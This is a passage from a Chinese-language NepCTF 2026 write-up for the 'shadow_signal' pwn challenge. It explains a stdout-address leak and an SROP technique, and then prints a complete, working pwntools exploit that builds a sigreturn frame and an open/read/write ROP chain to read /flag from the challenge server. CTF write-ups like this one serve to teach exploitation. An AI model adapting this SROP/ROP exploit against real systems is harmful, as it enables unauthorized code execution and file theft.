> 来源：https://github.com/fjh1997/nepctf2026-writeup/blob/main/writeup/WriteUp_%E5%AE%8C%E6%95%B4%E8%87%AA%E5%8C%85%E5%90%AB.md
> 以下为原始完整 writeup 中 #51 的连续章节摘录；代码未执行。

## #51 shadow_signal

### 1. 题目信息
- **题目名称**：shadow_signal
- **题目类型**：PWN
- **最终 Flag**：`NepCTF{2a86d9a5-f15c-d63f-5634-b4a858c07963}`

### 2. 题目分析
shadow_signal：gift 直接漏 stdout 地址；SIGSEGV handler 会大读，ucontext 可控，标准 SROP 舞台。

### 3. 解题思路
restorer 用 `__restore_rt`，SROP 先 `read` 到 BSS，再 ORW `/flag`。

### 4. 解题过程
`python3 work/51/repro/exp_shadow.py HOST`（默认 SSL 443）。Flag：`NepCTF{2a86d9a5-f15c-d63f-5634-b4a858c07963}`。

### 5. 解题代码

下面贴的是我这边实际用过、并且复现能跑通的脚本全文。路径按 work 目录保留，方便对照。

#### `work/51/repro/exp_shadow.py`
```python
#!/usr/bin/env python3
"""#51 shadow_signal: gift stdout leak -> SROP read to BSS -> ORW"""
from pwn import *
context.arch='amd64'
libc=ELF(__file__.replace('exp_shadow.py','libc.so.6'), checksec=False)
pop_rdi,pop_rsi,pop_rdx_rbx,pop_rax=0x2a3e5,0x2be51,0x904a9,0x45eb0
syscall_ret,retg,restore_rt=0x91316,0x29139,0x42520
STAGE,FLAG_OFF,BUF=0x404800,0x180,0x404800+0x200

def pwn(host, port=443, ssl=True, path=b'/flag\x00', fd=3):
    io=remote(host,port,ssl=ssl)
    io.recvuntil(b'gift: '); gift=int(io.recvline(),16); base=gift-libc.sym['_IO_2_1_stdout_']
    restorer=base+restore_rt; sysret=base+syscall_ret
    prdi,prsi,prdx,prax,ret=base+pop_rdi,base+pop_rsi,base+pop_rdx_rbx,base+pop_rax,base+retg
    pl=bytearray(0x500); pl[0x118:0x120]=p64(restorer)
    def g(i,v): pl[0x148+i*8:0x148+i*8+8]=p64(v)
    g(13,0); g(8,0); g(9,STAGE); g(12,0x400); g(15,STAGE); g(16,sysret); g(17,0x202); g(18,0x33)
    io.send(p64(0)); io.recvuntil(b'signal\n'); io.send(bytes(pl))
    path=path.ljust(8,b'\x00')
    rop=flat([ret,prdi,STAGE+FLAG_OFF,prsi,0,prax,2,sysret,prdi,fd,prsi,BUF,prdx,0x100,0,prax,0,sysret,prdi,1,prsi,BUF,prdx,0x100,0,prax,1,sysret])
    stage=bytearray(0x400); stage[:len(rop)]=rop; stage[FLAG_OFF:FLAG_OFF+len(path)]=path
    sleep(0.2); io.send(bytes(stage)); return io.recvall(timeout=3)

if __name__=='__main__':
    import sys
    host=sys.argv[1] if len(sys.argv)>1 else 'j6nwy0wx-lbld-sy3k-hqpb-6a5cec8832257-neptunus.nepctf.com'
    print(pwn(host))
```

### 6. AI 使用说明
这题用了 Claude Code / 偶尔 Grok 帮我盯日志和搓草稿；关键判断、踩坑取舍和最终提交是我自己点的。会话可以按题名在 `~/.claude/projects` 里翻。

---

